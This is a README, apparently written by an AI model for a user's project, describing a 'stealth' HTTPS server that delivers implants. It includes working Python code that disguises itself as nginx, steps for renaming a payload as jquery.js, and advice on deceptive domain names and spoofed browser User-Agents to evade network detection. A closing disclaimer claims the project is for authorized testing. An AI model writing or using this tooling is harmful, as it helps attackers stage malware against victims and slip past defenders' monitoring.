This README is designed to be clear, professional, and consistent with the "Stealth through Normalcy" theme of your project. It organizes the setup process, the server logic, and the deployment steps into a standard documentation format.

---

# Secure Asset Delivery Server

A Python-based HTTPS server designed to deliver files (implants/payloads) securely while mimicking a standard production Nginx environment. This project focuses on **operational security (OpSec)** by utilizing legitimate TLS certificates and header obfuscation to evade network-based detection.

## ## Features

* **Server Masking:** Overrides default Python headers to report as `nginx/1.25.4`.
* **Legitimacy Headers:** Includes standard production headers like `Cache-Control` and `X-Content-Type-Options`.
* **Modern TLS:** Enforces `ECDHE+AESGCM` cipher suites to match modern browser traffic profiles.
* **Stealth Logging:** Redirects traffic logs to a local file instead of `stdout` to maintain a low profile on the host.

---

## ## Project Structure

```text
.
├── server.py           # The Python server script
├── static/             # Directory for assets
│   └── js/
│       └── jquery.js   # The renamed implant file
├── access.log          # Hidden traffic logs
├── fullchain.pem       # CA-signed certificate (Let's Encrypt)
└── privkey.pem         # Private key
```

---

## ## Installation & Setup

### 1. Generate Legitimate Certificates
To avoid "Self-Signed Certificate" flags, use a registered domain and Let's Encrypt.

```bash
# Install certbot
sudo apt install certbot

# Generate certificates via standalone mode (Port 80 must be open)
sudo certbot certonly --standalone -d yourdomain.com
```

### 2. Configure the "Implant"
Place your payload in the static directory and rename it to mimic a common library.

```bash
mkdir -p static/js
cp my_payload.exe static/js/jquery-3.7.1.min.js
```

### 3. Usage
Run the server with root privileges (required to bind to port 443).

```bash
sudo python3 server.py
```

---

## ## Implementation Details

### The Server Logic (`server.py`)
The server uses `http.server` but intercepts the `version_string` to hide its Python origins.



```python
import http.server
import ssl

class StealthHandler(http.server.SimpleHTTPRequestHandler):
    def version_string(self):
        return "nginx/1.25.4"

    def end_headers(self):
        self.send_header("Cache-Control", "max-age=3600, public")
        self.send_header("X-Content-Type-Options", "nosniff")
        super().end_headers()

    def log_message(self, format, *args):
        with open("access.log", "a") as f:
            f.write(f"{self.address_string()} - [{self.log_date_time_string()}] {format%args}\n")

# Server Initialization
address = ('0.0.0.0', 443)
httpd = http.server.HTTPServer(address, StealthHandler)

# TLS Wrap
context = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)
context.set_ciphers('ECDHE+AESGCM:ECDHE+CHACHA20')
context.load_cert_chain(certfile='fullchain.pem', keyfile='privkey.pem')

httpd.socket = context.wrap_socket(httpd.socket, server_side=True)
httpd.serve_forever()
```

---

## ## Operational Recommendations

### Hostname Selection
Register a domain that matches the context of the target environment. 
* **Good:** `cdn-updates-service.net`
* **Bad:** `totally-not-a-payload-server.xyz`

### Client-Side (The Loader)
Ensure your loader sends a legitimate **User-Agent** header. If the loader uses a default library header (like `python-requests/2.x` or `Go-http-client/1.1`), it will be flagged regardless of the server's stealth.

**Recommended User-Agent:**
`Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36`

---

## ## Disclaimer
This project is for authorized security testing and educational purposes only. Unauthorized access to computer systems is illegal.